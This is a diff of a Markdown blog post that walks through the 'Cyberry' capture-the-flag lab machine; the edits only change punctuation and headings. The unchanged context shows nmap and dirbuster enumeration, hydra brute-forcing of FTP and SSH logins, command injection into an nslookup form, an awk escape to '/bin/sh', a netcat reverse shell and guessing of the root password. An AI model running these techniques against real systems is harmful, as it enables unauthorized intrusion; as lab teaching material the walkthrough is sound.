@@ -18,7 +18,7 @@ Cyberry are eagerly anticipating the release of their new "Berrypedia" website,
 a life-long project which offers knowledge and insight into all things Berry!
 
 ### Information Gathering
-Let's kick this off with a `nmap` scan to establish the services available in **cyberry**:
+Let's kick this off with a `nmap` scan to establish the services available in **cyberry**.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.128
@@ -76,7 +76,7 @@ There were several HTML comments in the source code encoded in `base64`.
 
 ![comments.png](/assets/images/posts/cyberry-walkthrough/cyberry-1.png)
 
-Decoding the above strings revealed the following:
+Decoding the above strings revealed the following.
 
 ```
 # curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
@@ -88,7 +88,7 @@ secretfile.html
 work-in-progress.png
 ```
 
-Requesting for `/secretfile.html` resulted in:
+Requesting for `/secretfile.html` resulted in.
 
 ```
 # curl -i 192.168.198.128/secretfile.html
@@ -117,7 +117,7 @@ Content-Type: text/html
 </html>
 ```
 
-The binary string was decoded to:
+The binary string was decoded to the following.
 
 ```bash
 # for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
@@ -127,7 +127,7 @@ boss.gif
 
 ![boss.gif](/assets/images/posts/cyberry-walkthrough/boss.gif)
 
-Requesting for `/work-in-progress.png` resulted in:
+Requesting for `/work-in-progress.png` resulted in.
 
 ```
 # curl -i 192.168.198.128/work-in-progress.png
@@ -155,7 +155,7 @@ There is a slight twist before the QR code can be decoded. You need to flip it h
 
 It was decoded to `/berrypedia.html`.
 
-### Directory/File Enumeration - Part 2
+### Directory/File Enumeration (2)
 
 The same conclusion can also be reached with `dirbuster` without going through the hard way.
 
@@ -192,11 +192,11 @@ DirBuster Stopped
 
 The login page had a weakness - it leaked information about the existence of a user.
 
-_If the user does not exist:_
+_If the user does not exist_
 
 ![non-exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-5.png)
 
-_If the user exists and the password is invalid:_
+_If the user exists and the password is invalid_
 
 ![exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-6.png)
 
@@ -327,7 +327,7 @@ http://192.168.198.128:61955/phpmyadmin (Status: 301)
 =====================================================
 ```
 
-Requesting for `http://192.168.198.128:61955/H` revealed something interesting:
+Requesting for `http://192.168.198.128:61955/H` revealed something interesting.
 
 ```
 # curl 192.168.198.128:61955/H
@@ -355,7 +355,7 @@ Requesting for `http://192.168.198.128:61955/H` revealed something interesting:
 
 ### Brainfuck
 
-Despite its strange looking form, the code above was written in the esoteric [Brainfuck][3] language. Using an online [interpreter][4], it was deciphered to:
+Despite its strange looking form, the code above was written in the esoteric [Brainfuck][3] language. Using an online [interpreter][4], it was deciphered to the following.
 
 ```
 Hello World!
@@ -369,7 +369,7 @@ kerry
 pw: bakeoff
 ```
 
-OK. I have the team members' names and a password but to whom does the password belong to? This can be verified very easily using `hydra`:
+OK. I have the team members' names and a password but to whom does the password belong to? This can be verified very easily using `hydra`.
 
 ```
 # hydra -L members.txt -p bakeoff -f ftp://192.168.198.128
@@ -390,7 +390,7 @@ Noticed that `.bash_history` is a directory? This is unusual and definitely wort
 
 ![.bash_history.png](/assets/images/posts/cyberry-walkthrough/cyberry-10.png)
 
-`.reminder.enc` is a ciphertext encrypted using `openssl enc` (`Salted__` header) while `.trash` is a list of common passwords:
+`.reminder.enc` is a ciphertext encrypted using `openssl enc` (`Salted__` header) while `.trash` is a list of common passwords.
 
 ```
 # cat .trash
@@ -433,13 +433,13 @@ for c in $(cat ciphers.txt); do
 done
 ```
 
-`ciphers.txt` contained the available ciphers. Running the script revealed the following:
+`ciphers.txt` contained the available ciphers. Running the script revealed the following.
 
 ![decrypted.png](/assets/images/posts/cyberry-walkthrough/cyberry-2.png)
 
 It certainly looked like some sort of password!
 
-### Login page `/login.php` - Part 2
+### Login page `/login.php` (2)
 
 Recall from above the site has a login page to the Berrypedia Admin Panel? Well, this site has a login page as well.
 
@@ -451,7 +451,7 @@ Let's try and go with `(mary:dangleberry69)` and see what we get.
 
 ### Secure Section
 
-In the secure section, there was a page that appeared to be performing `nslookup` and the `host` parameter has 2 pre-defined values: **google.com** and **yahoo.com** as shown below:
+In the secure section, there was a page that appeared to be performing `nslookup` and the `host` parameter has 2 pre-defined values: **google.com** and **yahoo.com** as shown below.
 
 ![nslookup.png](/assets/images/posts/cyberry-walkthrough/cyberry-13.png)
 
@@ -494,7 +494,7 @@ Let's try to open a shell as `terry`. But before we do that, recall that a `fork
 
 ![terry.png](/assets/images/posts/cyberry-walkthrough/cyberry-21.png)
 
-`awk` can be used to escape to shell like so:
+`awk` can be used to escape to shell like so.
 ```awk
 awk 'BEGIN { system("/bin/sh") }'
 ```
@@ -509,7 +509,7 @@ On my `netcat` listener, a reverse shell connects.
 
 ![terry.png](/assets/images/posts/cyberry-walkthrough/cyberry-24.png)
 
-Let's start a pseudo-tty.
+Let's spawn a pseudo-tty.
 
 ![pty.png](/assets/images/posts/cyberry-walkthrough/cyberry-25.png)
 
@@ -525,7 +525,7 @@ The file at `/home/chuck/.deleted/deleted` provided hints to the `root` password
 
 ### Guessing the `root` password
 
-Here's what we know about the `root` password:
+Here's what we know about the `root` password.
 
 ```
 The password starts with "che" and ends with "rry"
@@ -567,7 +567,7 @@ The last word must contain the following:
 * "rry" at the end
 
 
-Similarly, finding the last word and meeting the above constraints:
+Similarly, finding the last word and meeting the above constraints.
 
 ```bash
 # for word in $(grep -E 'rry$' /usr/share/dict/words | tr -cd 'bemrry\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
@@ -585,7 +585,7 @@ chewmebacaberry
 chewbacabemerry
 chewbebacamerry
 ```
-One of the above got to be the `root` password. Using `hydra`, verifying the password is simple:
+One of the above got to be the `root` password. Using `hydra`, verifying the password is simple.
 
 ```
 # hydra -l root -P passwords.txt -f ssh://192.168.198.128
